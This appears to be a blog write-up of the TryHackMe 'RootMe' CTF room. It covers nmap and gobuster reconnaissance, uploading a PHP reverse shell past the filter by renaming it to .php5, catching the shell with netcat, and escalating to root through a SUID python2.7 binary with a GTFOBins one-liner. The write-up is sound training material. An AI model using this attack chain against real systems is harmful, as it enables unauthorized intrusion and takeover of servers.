---
layout: post
title: 'RootMe - TryHackMe Room Walkthrough'
date: 2026-01-19 02:27:15 +0000
categories: [cybersecurity]
tags:
  - tryhackme
  - writeup
description: "A ctf for beginners, can you root me?"
canonical_url: "https://medium.com/@hemanthakrishnach/rootme-tryhackme-room-walkthrough-5afa0746d7d1"
image: "/assets/images/posts/rootme-tryhackme-room-walkthrough/img-000-52607956.png"
---

A ctf for beginners, can you root me?

---

### RootMe — TryHackMe Room Walkthrough

A ctf for beginners, can you root me?![image](/assets/images/posts/rootme-tryhackme-room-walkthrough/img-000-52607956.png)

### Task 1: Deploy the Machine

First, connect to the TryHackMe network via OpenVPN and deploy the machine. Ensure you can ping the target IP address before proceeding.

### Task 2: Reconnaissance

To begin, we need to understand the target’s landscape. We start with an Nmap scan to identify open ports and running services.

#### Nmap Scan

We run an aggressive scan against the target IP to enumerate ports and service versions.
```bash
nmap -T4 -p- -A <MACHINE_IP>
```
![image](/assets/images/posts/rootme-tryhackme-room-walkthrough/img-001-368d30d4.png)![image](/assets/images/posts/rootme-tryhackme-room-walkthrough/img-002-cdbb5bba.png)

**Scan Results:** The scan reveals **2 open ports**:

- **Port 22:** Running **SSH** (OpenSSH 8.2p1 Ubuntu).- **Port 80:** Running **HTTP** (**Apache 2.4.41**).

Let’s check out the website:![image](/assets/images/posts/rootme-tryhackme-room-walkthrough/img-003-60d48c2a.png)

### Directory Brute-forcing

Next, we use `gobuster` to uncover hidden directories on the web server.
```bash
gobuster dir -u http://<MACHINE_IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```
![image](/assets/images/posts/rootme-tryhackme-room-walkthrough/img-004-db083aff.png)![image](/assets/images/posts/rootme-tryhackme-room-walkthrough/img-005-208485ab.png)

### Task 3: Getting a Shell

Navigating to `http://<TMACHINE_IP>/panel/`, we find a file upload form. This is a prime vector for a Remote Code Execution (RCE) attack.![image](/assets/images/posts/rootme-tryhackme-room-walkthrough/img-006-e93e2bd1.png)

### Payload Preparation

We can use the classic PentestMonkey PHP reverse shell.

1. Download the script from [GitHub](https://github.com/pentestmonkey/php-reverse-shell).- Edit the file to replace the `$ip` and `$port` variables with your attack machine's IP and listening port.

![image](/assets/images/posts/rootme-tryhackme-room-walkthrough/img-007-85ef1311.png)

### Bypassing File Upload Filters

When attempting to upload the standard `php-reverse-shell.php`, the server rejects it with the error: *"PHP não é permitido!"* (PHP is not allowed)![image](/assets/images/posts/rootme-tryhackme-room-walkthrough/img-008-6f2c7618.png)

To bypass this filter, we rename the file extension from `.php` to `.php5`.

- **Renamed File:** `php-reverse-shell.php5`.

After renaming, the upload is successful. The file is stored in the `/uploads/` directory.![image](/assets/images/posts/rootme-tryhackme-room-walkthrough/img-009-88d19fa8.png)

### Catching the Shell

1. Start a Netcat listener on your attack machine:

```bash
nc -nvlp 4444
```

2. Trigger the shell by navigating to http://<MACHINE\_IP>/uploads/php-reverse-shell.php5 in your browser.![image](/assets/images/posts/rootme-tryhackme-room-walkthrough/img-010-c25a0e73.png)

3. The listener should catch the connection, granting you a shell as the www-data user.![image](/assets/images/posts/rootme-tryhackme-room-walkthrough/img-011-d802ec56.png)

### Retrieving the User Flag

We can locate the user flag using the `find` command:
```bash
find / -name user.txt 2>/dev/null
```

- **Location:** `/var/www/user.txt`- **Content:** THM…

![image](/assets/images/posts/rootme-tryhackme-room-walkthrough/img-012-87c77942.png)

### Task 4: Privilege Escalation

Now that we have a user shell, we need to escalate our privileges to `root`.

### Enumerating SUID Binaries

We look for files with SUID permission, which run with the privileges of the file owner (usually root).
```bash
find / -user root -perm /4000 2>/dev/null
```

The output lists several standard binaries, but one stands out as unusual for a standard Linux distribution: `/usr/bin/python2.7`. Standard distributions rarely set the SUID bit on interpreters like Python by default.![image](/assets/images/posts/rootme-tryhackme-room-walkthrough/img-013-04bb521d.png)

### Exploiting Python SUID

We can use [GTFOBins](https://gtfobins.github.io/) to find a payload for Python SUID. The goal is to spawn a shell that maintains the SUID privileges.![image](/assets/images/posts/rootme-tryhackme-room-walkthrough/img-014-3ab2a39d.png)
```bash
python2.7 -c ‘import os; os.execl(“/bin/sh”, “sh”, “-p”)’
```

Running this command immediately escalates us to the **root** user.

### Retrieving the Root Flag

Finally, we locate and read the root flag.
```bash
find / -name root.txt 2>/dev/null
```

```bash
cat /root/root.txt
```
![image](/assets/images/posts/rootme-tryhackme-room-walkthrough/img-015-5bb699a1.png)

### Conclusion

We successfully compromised the web server via a file upload vulnerability by bypassing extension filters, then escalated privileges to root by exploiting a misconfigured Python SUID binary. Happy Hacking!

### Thank you for reading my write-up. I hope you found it helpful.
